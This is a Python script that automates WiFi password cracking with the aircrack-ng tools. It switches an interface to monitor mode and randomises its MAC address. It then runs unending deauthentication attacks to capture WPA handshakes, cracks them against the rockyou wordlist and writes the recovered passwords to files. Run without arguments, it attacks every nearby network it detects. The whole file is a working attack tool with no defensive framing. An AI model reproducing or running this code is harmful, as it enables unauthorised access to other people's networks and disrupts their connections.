import subprocess
import sys
import os
import re
import atexit
from pathlib import Path
from threading import Thread
from queue import Queue


class WiFi :
    def __init__(self, name, macaddress=None, channel=None) :
        self.name = name
        self.macaddress = macaddress
        self.channel = channel
        self.password = None


@atexit.register
def exit_monitoring_mode() :
    set_mode((interface, "Monitor"), "Managed")


def check_requirements() :
    # Root permissions
    if os.geteuid() != 0 :
        sys.exit("[-] You need root permissions !")
    
    # Usage : python3 crack_wifi.py  OR  python3 crack_wifi.py <WiFi> 
    elif len(sys.argv) > 2 :
        sys.exit("[-] Usage: python3 " + sys.argv[0] + "  OR  python3 " + sys.argv[0] + " <WiFi>")


def get_valid_interface() :
    print("[+] Getting valid interfaces")

    valid_interfaces = {}
    wireless_interface = subprocess.run("iwconfig", stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
    
    # Get all valid interfaces
    for interface in wireless_interface.stdout.split("\n\n") :
        valid_interfaces[interface.split()[0]] = " ".join(interface.split()[1:])

    if not valid_interfaces :
        sys.exit("[-] No valid interface")

    # Set the monitoring mode on an interface
    for interface in valid_interfaces.items() :
        monitoring_interface = set_mode(interface, "Monitor")

        if monitoring_interface :
            break

    if not monitoring_interface :
        sys.exit("[-] Monitoring mode is not supported by any interface")

    return monitoring_interface


def set_mode(interface, interface_mode) :
    print("[+] Setting " + interface_mode + " mode")

    # Check if the interface is already in this mode
    if "Mode:" + interface_mode in interface[1] :
        return interface[0]

    # If not, let's try to set it
    subprocess.run(["ifconfig", interface[0], "down"], stdout=subprocess.DEVNULL)

    # Change the monitoring interface mac address
    if interface_mode == "Monitor" :
        print("[+] Changing macaddress")
        subprocess.run(["macchanger", "-r", interface[0]], stdout=subprocess.DEVNULL)
    
    new_mode = subprocess.run(["iwconfig", interface[0], "mode", interface_mode], stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
    subprocess.run(["ifconfig", interface[0], "up"], stdout=subprocess.DEVNULL)

    if not new_mode.stderr :
        return interface[0]


def kill_interfering_processes() :
    print("[+] Killing processes that might interfere")

    # Kill processes that might interfere with the aircrack-ng suite
    subprocess.run(["airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)


def get_wifi_information(wifi_name, monitoring_interface) :
    print("[+] Getting " + wifi_name + " macaddress and channel(s)")
    
    wifis_information = {}
    ansi_escape = re.compile(r"\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])")

    # Get WiFi(s) macaddress and channel
    with subprocess.Popen(["airodump-ng", "--essid", wifi_name, monitoring_interface, "-a"], stdout=subprocess.PIPE, bufsize=1, universal_newlines=True) as monitoring :
        for line in monitoring.stdout:
            line = ansi_escape.sub("", line)

            macaddresses = re.findall(r"(?:[0-9a-fA-F]:?){12}", line)

            if len(macaddresses) == 1 and len(line.split()) > 10 :
                wifis_information[macaddresses[0]] = line.split()[5]

            elif len(macaddresses) == 2 and macaddresses[0] in wifis_information :
                return macaddresses[0], wifis_information[macaddresses[0]]


def get_wifis(monitoring_interface, queue) :
    print("[+] Monitoring all the trafic")

    wifis = {}
    connected_device = {}

    ansi_escape = re.compile(r"\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])")

    # Get WiFis macaddress and channel
    with subprocess.Popen(["airodump-ng", monitoring_interface, "-a"], stdout=subprocess.PIPE, bufsize=1, universal_newlines=True) as monitoring_wifis :
        for line in monitoring_wifis.stdout:
            line = ansi_escape.sub("", line)

            macaddresses = re.findall(r"(?:[0-9a-fA-F]:?){12}", line)

            # Get all different WiFi
            if len(macaddresses) == 1 and len(line.split()) > 10 :
                wifi_name = " ".join(line.split()[10:])
                wifi_macaddress = macaddresses[0]
                wifi_channel = line.split()[5]

                if not re.match(r"^<length: [0-9]+>$", wifi_name) and not re.search(r"handshake: (?:[0-9a-fA-F]:?){12}", line):
                    if wifi_name not in wifis :
                        wifis[wifi_name] = []

                    if {wifi_macaddress: wifi_channel} not in wifis[wifi_name] :
                        wifis[wifi_name].append({wifi_macaddress: wifi_channel})

            # Get all connected device to a WiFi
            elif len(macaddresses) == 2 :
                for wifi, wifi_information in wifis.items() :
                    for information in wifi_information :
                        for maccaddress, channel in information.items() :
                            if macaddresses[0] == maccaddress :
                                if maccaddress not in connected_device :
                                    connected_device[maccaddress] = []
                                    queue.put({wifi: {maccaddress: channel}})
                                
                                if macaddresses[1] not in connected_device[maccaddress] :
                                    connected_device[maccaddress].append(macaddresses[1])


def lets_hack(wifi, monitoring_interface) :
    print("\n[+] Attacking: " + wifi.macaddress + " " + wifi.channel + " " + wifi.name)

    # Let's hack
    while wifi.password == None :
            handshake = get_wifi_handshake(wifi, monitoring_interface)
            wifi.password = crack_wifi_password(wifi.name, handshake)
    
    save_wifi_password(wifi.name, wifi.password)


def get_wifi_handshake(target_wifi, monitoring_interface) :
    print("[+] Trying to get the WiFi handshake")

    # Get the WiFi handshake
    attack_pid = deauthentication_attack(target_wifi, monitoring_interface)
    handshake = monitoring_wifi(target_wifi, monitoring_interface, attack_pid)

    return handshake


def deauthentication_attack(target_wifi, monitoring_interface) :
    print("Deauthentication attack in progress...")

    # Do a deauthentication attack to get the target WiFi handshake
    attack = subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", target_wifi.macaddress, monitoring_interface, "-D"], stdout=subprocess.DEVNULL)
    
    return attack.pid


def monitoring_wifi(target_wifi, monitoring_interface, attack_pid) :
    create_wifi_directory(target_wifi.name)

    # Monitor the target WiFi to get its handshake
    with subprocess.Popen(["airodump-ng", "-w", "./WiFis/" + target_wifi.name + "/" + target_wifi.name, "-c", target_wifi.channel, "--bssid", target_wifi.macaddress, monitoring_interface, "-a"], stdout=subprocess.PIPE, bufsize=1, universal_newlines=True) as monitoring :
        for line in monitoring.stdout :
            if "Created capture file" in line :
                handshake_file = re.search(r"./WiFis/" + target_wifi.name + r"/[\w \-.cap]+", line)[0]
            
            if re.search(r"handshake: (?:[0-9a-fA-F]:?){12}", line) :
                os.kill(attack_pid, 9)
                return handshake_file


def create_wifi_directory(wifi_directory, wifi_name="") :
    if wifi_directory == "Passwords" :
        print("[+] Saving " + wifi_name + " password in ./WiFis/" + wifi_directory + "/ directory")
    
    elif not Path("./WiFis/" + wifi_directory).exists() :
        print("[+] Creating a repository for " + wifi_directory)
        
    # Create a repository to store information about a WiFi
    Path("./WiFis/" + wifi_directory).mkdir(parents=True, exist_ok=True)


def crack_wifi_password(wifi_name, handshake_file) :
    print("\n[+] Cracking " + wifi_name + " password!")
    
    # Crack the WiFi password with rockyou.txt
    with subprocess.Popen(["aircrack-ng", handshake_file, "-w", "/usr/share/wordlists/rockyou.txt"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=1, universal_newlines=True) as crack :
        for line in crack.stdout :
            if "Packets contained no EAPOL data; unable to process this AP." in line :
                print("[-] Error, Try again...")
                break 

            if "KEY FOUND!" in line :
                wifi_password = re.search(r"KEY FOUND! \[ .* \]", line)[0]
                print(wifi_password)
                return wifi_password[13:-2]


def save_wifi_password(wifi_name, wifi_password) :
    create_wifi_directory("Passwords", wifi_name)

    # Save the WiFi password in a file
    with open("./WiFis/Passwords/" + wifi_name + ".password", "w") as password_file :
        password_file.write(wifi_password + "\n")



if __name__ == "__main__" :
    check_requirements()
    interface = get_valid_interface()
    kill_interfering_processes()

    # More efficient if only one WiFi is attacked at a time
    if len(sys.argv) > 1 :
        wifi = WiFi(sys.argv[1])
        wifi.macaddress, wifi.channel = get_wifi_information(wifi.name, interface)
        lets_hack(wifi, interface)

    else :
        wifis = Queue()
        Thread(target=get_wifis, args=(interface, wifis)).start()

        while True :
            wifi_information = wifis.get()
            wifi = WiFi([*wifi_information][0], list(wifi_information[[*wifi_information][0]])[0], list(wifi_information[[*wifi_information][0]].values())[0])
            Thread(target=lets_hack, args=(wifi, interface)).start()